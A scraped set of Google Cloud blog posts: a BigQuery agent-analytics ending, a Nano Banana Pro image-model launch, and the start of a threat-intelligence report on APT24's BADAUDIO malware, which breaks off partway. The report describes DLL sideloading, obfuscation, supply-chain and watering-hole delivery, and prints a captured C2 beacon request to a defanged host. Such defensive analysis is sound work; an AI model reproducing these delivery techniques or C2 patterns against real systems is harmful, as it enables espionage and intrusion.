metrics, using familiar BigQuery semantics. Here is an illustration of your logs as they appear in the BigQuery table using a</span><span style=\"font-style: italic; vertical-align: baseline;\"> “</span><code style=\"font-style: italic; vertical-align: baseline;\">select * limit 10” </code><span style=\"vertical-align: baseline;\">on non-empty columns</span><span style=\"font-style: italic; vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_9CwMEjP.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">It's time to unlock the full potential of your agents. With the new BigQuery Agent Analytics you</span><span style=\"vertical-align: baseline;\"> can answer critical usage questions to refine your agent, optimize performance, and deliver a superior user experience.</span><span style=\"vertical-align: baseline;\">There is more to come in the near future, including integration with LangGraph to advanced analysis for multimodal agent interactions.</span></p>\n<p><span style=\"vertical-align: baseline;\">To get started, check out the </span><a href=\"https://google.github.io/adk-docs/tools/google-cloud/bigquery-agent-analytics/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud BigQuery Agent Analytics documentation</span></a><span style=\"vertical-align: baseline;\"> on the Google ADK site. For a guided walkthrough on using this plugin, we invite you to explore our comprehensive new</span><a href=\"https://codelabs.developers.google.com/adk-bigquery-agent-analytics-plugin\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">codelab</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">We’re excited to see the amazing, data-driven conversational experiences you build.</span></p></div>",
        "published_date": "2025-11-20 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/nano-banana-pro-available-for-enterprise/",
        "title": "Announcing Nano Banana Pro for every builder and business",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Nano_Banana_Pro_blog_hero.max-600x600.png",
        "author": "Madhu Gurumurthy",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Earlier this year we launched Nano Banana </span><span style=\"vertical-align: baseline;\">(Gemini 2.5 Flash Image). It became the top rated image model in the world, and we were excited to see the overwhelming response from our customers. Nano Banana made it dramatically easier – and more fun – to edit images with natural language and make visuals with consistent characters.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’re announcing </span><a href=\"https://blog.google/technology/ai/nano-banana-pro\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Nano Banana Pro</strong></a><strong style=\"vertical-align: baseline;\"> (Gemini 3 Pro Image)</strong><span style=\"vertical-align: baseline;\">, our state-of-the art image generation and editing model, available starting today in </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://workspace.google.com/solutions/ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Workspace</span></a><span style=\"vertical-align: baseline;\">, and coming soon to </span><a href=\"https://cloud.google.com/gemini-enterprise?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=1710046-Workspace-DR-NA-US-en-Google-BKWS-EXA-na&amp;utm_content=c-Hybrid+%7C+BKWS+-+EXA+%7C+Txt_Pollux-435278751514&amp;utm_term=gemini+enterprise&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=23071651391&amp;gclid=CjwKCAiA8vXIBhAtEiwAf3B-gzz0u3LSmwxBXBql13NaVpNPlpH_mOOIT4UTcP-HIo_ei8K5e5OQ8RoCDjIQAvD_BwE&amp;e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">. Nano Banana Pro excels in visual design, world knowledge, and text generation, making it easier for enterprises to: </span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deploy localized global campaigns faster. </strong><span style=\"vertical-align: baseline;\">The model supports text rendering in </span><a href=\"https://deepmind.google/models/gemini-image/pro/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">multiple languages</span></a><span style=\"vertical-align: baseline;\">. You can even take an image and translate the text inside it, so your creative work is ready for other countries immediately.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Create more accurate, context-rich visual assets</strong><span style=\"vertical-align: baseline;\">. Because Nano Banana Pro connects to Google Search, it understands the real world context. This means you can generate maps, diagrams, and infographics that get the facts and details right — perfect for training manuals or technical guides where accuracy matters.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Maintain stronger creative control and brand fidelity. </strong><span style=\"vertical-align: baseline;\">Keeping brand, product, or character consistency is often the biggest challenge when using AI for creative assets. Nano Banana Pro keeps your creative team in the driver's seat with our expanded visual context window. Think of this as \"few-shot prompting\" for designers: by allowing you to upload up to 14 reference images, you can now load a full style guide simultaneously—including logos, color palettes, character turnarounds, and product shots. This ensures the model has the complete context needed to match your brand identity. Need to refine the result? Just describe the change using natural language to add, remove, or replace details. Nano Banana Pro supports up to 4K images for a higher level of detail and sharpness across multiple aspect ratios.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Nano Banana Pro and Nano Banana are designed to power a complete creative workflow. Start with Nano Banana for high-velocity ideation, then transition to Nano Banana Pro when you need the highest fidelity for production-ready assets. </span></p>\n<p><strong style=\"vertical-align: baseline;\">Supporting your commercial needs: </strong><span style=\"vertical-align: baseline;\">Both models fall under our shared responsibility framework, and you can ensure transparency and responsible use with built-in SynthID watermarking on every generated asset. We’re committed to supporting your commercial needs with copyright indemnification coming at general availability.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Revive Image\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Group_4_1.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"font-style: italic; vertical-align: baseline;\">Prompt: Translate all the English text on the three yellow and blue cans into Korean, while keeping everything else the same</span></p>\n<p><strong style=\"vertical-align: baseline;\">Search grounding:</strong><span style=\"vertical-align: baseline;\"> Nano Banana Pro can use Google Search to research topics based on your query, and reason on how to present factual and grounded information. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Chai visual\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/World_Knowledge_Elaichi_Chai.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"font-style: italic; vertical-align: baseline;\">Prompt: Create an infographic that shows how to make elaichi chai.</span></p>\n<p><strong style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Advanced composition: </strong></strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Add up to 14 input reference images to combine elements, blend scenes, and transfer designs to create something entirely new. Nano Banana Pro maintains the quality of a developed asset but delivers it in minutes.</span></span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image5_AUaCYxB.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"font-style: italic; vertical-align: baseline;\">Prompt: Editorial style photo, female model is wearing jeans, yellow top with polka dots, headband, red heels, black bag on her arm. She is holding an iced matcha latte in one hand and in the other hand she is holding a leash on a chow chow dog. She is standing in front of the house in Beverly Hills, looking into the camera. Respect the overall aesthetic and color palette of the photo with the house. There is a white logo \"Love Letters\" with 10% opacity shadow in the lower left corner.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Advanced text rendering: </strong><span style=\"vertical-align: baseline;\">Generate clear, accurate text within images, unlocking use cases for product mockups, posters, and educational diagrams. This could include natural text placement (e.g., wrapping text around an object) and support for various fonts and styles.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Woodchuck visual\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Text_Rendering_Woodchuck.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"font-style: italic; vertical-align: baseline;\">Prompt: Create an image showing the phrase \"How much wood would a woodchuck chuck if a woodchuck could chuck wood\" made out of wood chucked by a woodchuck.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Powering the platforms that power creatives </strong></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Logo Wall NBPro\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Gemini_3_Pro_Image_Logo_Wall_Draft_4.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Nano Banana Pro is becoming an essential infrastructure layer for the creative economy, powering the design platforms that creatives rely on. By integrating our models directly into their workflows, we are helping industry leaders like Adobe, Figma, and Canva deliver next-generation AI capabilities. Here’s what they have to say about building on our foundation:</span></p>\n<p><span style=\"vertical-align: baseline;\">“With Google’s Nano Banana Pro now in Adobe Firefly and Photoshop, we’re giving creators and creative professionals yet another best-in-class image model they can tap into alongside Adobe’s powerful editing tools to turn ideas into high-impact content with full creative control. It’s an exciting step in our partnership with Google to help everyone create with AI.” </span><strong style=\"vertical-align: baseline;\">— Hannah Elsakr, vice president, New Gen AI Business Ventures, Adobe</strong></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=2hAFosdzc7Q\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Adobe Firefly uses Nano Banana Pro</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=2hAFosdzc7Q\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">\"Nano Banana Pro is a revolution for AI image editing. We’ve been surprised and amazed by its visual powers and prompt understanding. One key upgrade is its ability to translate and render text across multiple languages; which is very important as we work to empower the world to design anything at Canva.”  </span><strong style=\"vertical-align: baseline;\">— Danny Wu, Head of AI Products at Canva</strong></p>\n<p><span style=\"vertical-align: baseline;\">“With Nano Banana Pro in Figma, designers gain a tool that is creative and precise at the same time, producing perspective shifts, lighting changes, and full scene variations with dependable style and character consistency.\" </span><strong style=\"vertical-align: baseline;\">— Loredana Crisan, Chief Design Officer, Figma</strong></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=XD3SoHHDeP4\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Gemini 3 Pro (with Nano Banana) now in Figma</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=XD3SoHHDeP4\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">\"At Photoroom we serve some of the largest fashion marketplaces and retailers in the world, empowering brands to visualize future collections instantly and bring products to market faster. Leveraging Nano Banana Pro, we've enhanced our Virtual Fashion Model and Change Fabric Color workflow to make apparel transformation more flexible and realistic than ever.\" </span><strong style=\"vertical-align: baseline;\">— <strong style=\"vertical-align: baseline;\">Matt Rouif, CEO, Photoroom</strong></strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_7tGdLqH.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">The world’s leading agencies and brands are delivering results</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We’re moving from experimentation to enterprise-grade production, where efficiency and performance shine.</span></p>\n<p><span style=\"vertical-align: baseline;\">This model makes product-based image editing much easier. After testing multi-product swaps, it handled complex edits with impressive coherence and minimal prompt fuss. It’s incredibly scalable for creative teams who care about quality and speed. </span><strong style=\"vertical-align: baseline;\">— Juliette Suvitha, Head of Creative at Pencil</strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_DZke9Sl.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">“HubX is using Nano Banana Pro to edit, retouch, expand, and upscale photos with AI — delivering significant improvements in identity preservation, context awareness, and output resolution quality. It’s allowing anyone, regardless of technical background, to create professional-grade visuals effortlessly.\" </span><strong style=\"vertical-align: baseline;\">— Kaan Ortabas, Co-Founder, HubX</strong></p>\n<p><span style=\"vertical-align: baseline;\">\"The new Nano Banana Pro model has completely eliminated the friction between idea and execution. Imagination is now the only limitation. This newfound creative velocity isn't just theory either, it’s already powering our marketing asset production.\" </span><strong style=\"vertical-align: baseline;\">— David Sandström, CMO, Klarna</strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_w4bvI6E.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">\"Nano Banana Pro is a step forward in quality and can help us unlock even better image generation for merchants\"</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">— Matthew Koenig, Senior Staff Product Manager, Shopify</strong></p>\n<p><span style=\"vertical-align: baseline;\">\"Our early Nano Banana Pro tests are impressive. It integrates smoothly into our pipeline and delivers noticeably better quality. Lighting feels real, scenes more natural, and product accuracy sharper. This is a meaningful step forward in visual content creation.\"</span><strong style=\"vertical-align: baseline;\"> - Bryan Godwin, Director, Visual AI, Wayfair</strong></p>\n<p><span style=\"vertical-align: baseline;\">“WPP received early access to Nano Banana Pro in WPP Open, through our expanded AI partnership.  The model has already impacted creative and production workflows, with tests performed for our clients such as Verizon allowing us to translate creative concepts to assets with speed and scale. Improvements in text fidelity and reasoning allow us to push the boundaries of Generative Media for more complex use cases, such as product infographics and localization. We’re so excited to bring the power of this model and our Google partnership to our shared clients.”  <strong style=\"vertical-align: baseline;\">— Elav Horwitz, Chief Innovation Officer, WPP</strong></span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=9fgipXCZoAE\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">WPP uses Nano Banana Pro</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=9fgipXCZoAE\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We're making Nano Banana Pro available where your teams already work, keeping you in the driver’s seat:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For developers:</strong><span style=\"vertical-align: baseline;\"> <span style=\"vertical-align: baseline;\">You can start building with Nano Banana Pro in the Gemini API today in </span><a href=\"https://console.cloud.google.com/vertex-ai/studio/multimodal?mode=prompt&amp;model=gemini-3-pro-image-preview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\">. For those building with Vertex AI, Nano Banana Pro is an enterprise-grade offering that includes Provisioned Throughput, Pay As You Go, and advanced safety filters.</span></span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">For business teams:</strong><span style=\"vertical-align: baseline;\"> <span style=\"vertical-align: baseline;\">Nano Banana is available in </span><a href=\"https://cloud.google.com/gemini-enterprise\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\"> with Nano Banana Pro coming soon. Gemini Enterprise is our advanced agentic platform that brings the best of Google AI to every employee, for every workflow. And, starting today, Nano Banana Pro is rolling out to Google Workspace customers in Google Slides, Vids, the Gemini app, and NotebookLM — </span><a href=\"http://workspaceupdates.googleblog.com/2025/11/workspace-nano-banana-pro.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">learn more</span></a><span style=\"vertical-align: baseline;\">.</span></span></li>\n</ul></div>",
        "published_date": "2025-11-20 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/apt24-pivot-to-multi-vector-attacks/",
        "title": "Beyond the Watering Hole: APT24's Pivot to Multi-Vector Attacks",
        "thumbnail": null,
        "author": "Google Threat Intelligence Group",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p>Written by: Harsh Parashar, Tierra Duncan, Dan Perez</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) is tracking a long-running and adaptive cyber espionage campaign by APT24, a People's Republic of China (PRC)-nexus threat actor. Spanning three years, APT24 has been deploying BADAUDIO, a highly obfuscated first-stage downloader used to establish persistent access to victim networks.</span></p>\n<p><span style=\"vertical-align: baseline;\">While earlier operations relied on broad strategic web compromises to compromise legitimate websites, APT24 has recently pivoted to using more sophisticated vectors targeting organizations in Taiwan. This includes the repeated compromise of a regional digital marketing firm to execute supply chain attacks and the use of targeted phishing campaigns.</span></p>\n<p><span style=\"vertical-align: baseline;\">This report provides a technical analysis of the BADAUDIO malware, details the evolution of APT24's delivery mechanisms from 2022 to present, and offers actionable intelligence to help defenders detect and mitigate this persistent threat.</span></p>\n<p><span style=\"vertical-align: baseline;\">As part of our efforts to combat serious threat actors, GTIG uses the results of our research to improve the safety and security of Google’s products and users. Upon discovery, all identified websites, domains, and files are added to the </span><a href=\"https://safebrowsing.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Safe Browsing</span></a><span style=\"vertical-align: baseline;\"> blocklist in order to protect web users across major browsers. We also conducted a series of victim notifications with technical details to compromised sites, </span><span style=\"vertical-align: baseline;\">enabling affected organizations to secure their sites and prevent future infections.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"BADAUDIO campaign overview\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: BADAUDIO campaign overview</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Payload Analysis: BADAUDIO and Cobalt Strike Beacon Integration</span></h3>\n<p><span style=\"vertical-align: baseline;\">The BADAUDIO malware is a custom first-stage downloader written in C++ that downloads, decrypts, and executes an AES-encrypted payload from a hard-coded command and control (C2) server. The malware collects basic system information, encrypts it using a hard-coded AES key, and sends it as a cookie value with the GET request to fetch the payload. The payload, in one case identified as Cobalt Strike Beacon, is decrypted with the same key and executed in memory. </span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GET https://wispy[.]geneva[.]workers[.]dev/pub/static/img/merged?version=65feddea0367 HTTP/1.1\nHost: wispy[.]geneva[.]workers[.]dev\nCookie: SSID=0uGjnpPHjOqhpT7PZJHD2WkLAxwHkpxMnKvq96VsYSCIjKKGeBfIKGKpqbRmpr6bBs8hT0ZtzL7/kHc+fyJkIoZ8hDyO8L3V1NFjqOBqFQ==\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\nConnection: Keep-Alive\nCache-Control: no-cache\n\n--------------------------\n\nGET\ncfuvid=Iewmfm8VY6Ky-3-E-OVHnYBszObHNjr9MpLbLHDxX056bnRflosOpp2hheQHsjZFY2JmmO8abTekDPKzVjcpnedzNgEq2p3YSccJZkjRW7-mFsd0-VrRYvWxHS95kxTRZ5X4FKIDDeplPFhhb3qiUEkQqqgulNk_U0O7U50APVE\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\nConnection: Keep-Alive\nCache-Control: no-cache</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 2: BADAUDIO code sample</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The malware is engineered with control flow flattening—a sophisticated obfuscation technique that systematically dismantles a program's natural, structured logic. This method replaces linear code with a series of disconnected blocks governed by a central \"dispatcher\" and a state variable, forcing analysts to manually trace each execution path and significantly impeding both automated and manual reverse engineering efforts.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Control flow flattening heavily obfuscates BADAUDIO malware\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Control flow flattening heavily obfuscates BADAUDIO malware (<a href=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig3.max-2100x2100.png\">expand image</a>)</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">BADAUDIO typically manifests as a malicious Dynamic Link Library (DLL) leveraging DLL Search Order Hijacking (MITRE ATT&amp;CK T1574.001) for execution via legitimate applications. Recent variants observed indicate a refined execution chain: encrypted archives containing BADAUDIO DLLs along with VBS, BAT, and LNK files. </span></p>\n<p><span style=\"vertical-align: baseline;\">These supplementary files automate the placement of the BADAUDIO DLL and a legitimate executable into user directories, establish persistence through legitimate executable startup entries, and trigger the DLL sideloading. This multi-layered approach to execution and persistence minimizes direct indicators of compromise.</span></p>\n<p><span style=\"vertical-align: baseline;\">Upon execution, BADAUDIO collects rudimentary host information: hostname, username, and system architecture. This collected data is then hashed and embedded within a cookie parameter in the C2 request header. This technique provides a subtle yet effective method for beaconing and identifying compromised systems, complicating network-based detection.</span></p>\n<p><span style=\"vertical-align: baseline;\">In one of these cases, the subsequent payload, decrypted using a hard-coded AES key, has been confirmed as Cobalt Strike Beacon. However, it is not confirmed that Cobalt Strike is present in every instance. The Beacon payload contained a relatively unique watermark that was previously observed in a separate APT24 campaign, shared in the Indicators of Compromise section. </span><a href=\"http://cloud.google.com/blog/topics/threat-intelligence/defining-cobalt-strike-components\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cobalt Strike watermarks</span></a><span style=\"vertical-align: baseline;\"> are a unique value generated from and tied to a given \"CobaltStrike.auth\" file. This value is embedded as the last 4 bytes for all BEACON stagers and in the embedded configuration for full backdoor BEACON samples.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Campaign Overview: BADAUDIO Delivery Evolves</span></h3>\n<p><span style=\"vertical-align: baseline;\">Over three years, APT24 leveraged various techniques to deliver BADAUDIO, including strategic web compromises, repeated supply-chain compromise of a regional digital marketing firm in Taiwan, and spear phishing.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"BADAUDIO campaign overview\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig4.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: BADAUDIO campaign overview</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Public Strategic Web Compromise Campaign</span></h4>\n<p><span style=\"vertical-align: baseline;\">Beginning in November 2022 we observed over 20 compromised websites spanning a broad array of subjects from regional industrial concerns to recreational goods, suggesting an opportunistic approach to initial access with true targeting selectively executed against visitors the attackers identified via fingerprinting. The legitimate websites were weaponized through the injection of a malicious JavaScript payload.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n      